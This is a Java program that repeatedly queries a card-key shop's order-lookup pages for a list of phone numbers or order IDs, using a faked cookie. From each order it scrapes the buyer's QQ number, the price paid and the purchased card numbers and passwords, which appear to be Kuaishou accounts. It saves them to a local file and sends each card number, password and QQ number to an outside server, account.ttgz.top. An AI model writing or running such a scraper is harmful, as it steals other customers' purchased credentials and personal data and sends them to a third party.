package com.sms.api.controller;

import com.alibaba.fastjson.JSONObject;
import com.sms.api.util.HttpClientUtil;
import com.sms.api.util.PatternUtil;
import org.springframework.util.StringUtils;

import java.io.File;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static com.sms.api.controller.SMSController.*;

/**
 * @program: api
 * @description:
 * @author: 邓太阳
 * @create: 2020-09-18 08:06
 **/
public class JIUYIMain {

    public static Double onePrice=0.0;

    public static void main(String[] args) throws IOException, InterruptedException {
//        getCar("123456");
        while (true){
            Calendar now = Calendar.getInstance();
            String h = (now.get(Calendar.HOUR_OF_DAY)<=9?"0"+now.get(Calendar.HOUR_OF_DAY):now.get(Calendar.HOUR_OF_DAY)+"");
            System.out.println(h);
            if (Integer.parseInt(h)>8) {
                Map<String,Object> data = new HashMap<>();
                String[] gets = getList(new File("JY.txt"));
                for (String s:gets){
                    getCar(s.trim());
                    Thread.sleep(200);
                }
            }else {
                Thread.sleep(1000*60*60);
            }

        }
    }


    public static void getCar(String phone) throws IOException, InterruptedException {
        Map<String,String> head = new HashMap<>();
        head.put("cookie",UUID.randomUUID().toString().replaceAll("-","")+"sb04a13bc=n1vs661ngq67sedlgp8b9088o0; Hm_lvt_30dd60caaf892f6e2f100a47953fc555=1600052598; Hm_lpvt_30dd60caaf892f6e2f100a47953fc555=1600387742");
        String url = "https://www.yijiufk.com";
        String queryRes="";
        try{
             queryRes = HttpClientUtil.get(url+"/orderquery?orderid="+phone+"&chkcode="+getCk()+"&querytype=3",head);
            Thread.sleep(200);
        }catch (Exception e){
            return;
        }

//        System.out.println(queryRes);
        List<String> orderIds = PatternUtil.between(queryRes,"/orderquery/orderid/","\"",1);
        String title = PatternUtil.between(queryRes,"<p>","</p>");
        for (int i=0;i<orderIds.size();i++){
            Thread.sleep(3000);
            String times = orderIds.get(i).substring(3,9);
            if(!getRun(times,"快手")) {
                continue;
            }
            String res ="";
            try {
                res              = HttpClientUtil.get(url+"/orderquery/orderid/"+orderIds.get(i),head);

            }catch (Exception e){
                continue;
            }
            String qq = PatternUtil.between(res,"uin=","&amp");
            if (qq==""){
                continue;
            }
            String sfk  = PatternUtil.between(res,"<li>实付款：","</li>");
            String orderTime = PatternUtil.between(res,"订单日期：","</li>");
            String id = orderIds.get(i).split("/")[0];
            String toekn = PatternUtil.between(res,"token:'","'");
            if (toekn =="") {
                continue;
            }
            String key ="";
            try {
                key =HttpClientUtil.get(url+"/checkgoods?orderid="+id+"&token="+toekn+"&t="+System.currentTimeMillis(),head);
            }catch (Exception e){
                continue;
            }

            Thread.sleep(3000);

            String time = PatternUtil.between(res,"订单日期：","</h5>");
            Map<String,Object> resData = (Map<String, Object>) JSONObject.parse(key);
            if(resData==null){
                continue;
            }
            if (resData.get("quantity")==null || StringUtils.isEmpty(sfk)) {
                onePrice=0.0;
            }else {
                onePrice=(Double.parseDouble(sfk)/Integer.parseInt(resData.get("quantity").toString()));
            }

            addFile("mhhcar.txt",orderTime+"--"+onePrice+"--"+qq+"-----"+(extract((resData.get("msg")!=null?resData.get("msg").toString():""),phone,orderTime,qq+"--"+onePrice))+"\n");
            System.err.println(resData);
        }


    }

    public static Pattern pattern = Pattern.compile("COM(.+)<a.+卡密：(.+)<a");

    public static List<String> extract(String html,String qq,String time,String title) {
        html = html.replace("\n", "");
        String[] card_items = html.split("卡号：");
        List<String> cardList = new ArrayList<>();
        for (String card_item : card_items) {


            List<String> list = PatternUtil.between(html,"卡密：COM","<a",0);


            for (String res:list){
                res = res.replace(",","\t");
                String[] data = res.split("\t");
                if (data.length>1){
                    String cardNumber = data[0];
                    String cardPass = data[1];
                    new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            String s = HttpClientUtil.get("http://account.ttgz.top/ks/addAccount?key=COM"+cardNumber+"&mobile="+cardPass+"&qq="+qq+"&time="+ URLEncoder.encode( time, "UTF-8" )+"&title="+URLEncoder.encode( title, "UTF-8" ));
                            System.out.println(s);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
                }

            }

        }
        return cardList;
    }


}
